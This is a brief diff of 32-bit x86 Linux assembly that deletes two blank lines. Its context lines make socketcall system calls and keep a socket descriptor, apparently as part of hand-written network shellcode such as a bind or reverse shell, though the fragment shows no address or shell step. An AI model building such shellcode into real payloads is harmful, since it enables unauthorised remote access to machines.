@@ -15,7 +15,6 @@ _start:
 	push 0x2
 	mov ecx, esp
 	int 0x80
-	
 	xchg edi, eax
  	push 0x66
 	pop eax
@@ -31,7 +30,6 @@ _start:
 	push edi
 	mov ecx, esp
 	int 0x80
-	
 	push 0x66
 	pop eax
 	inc ebx
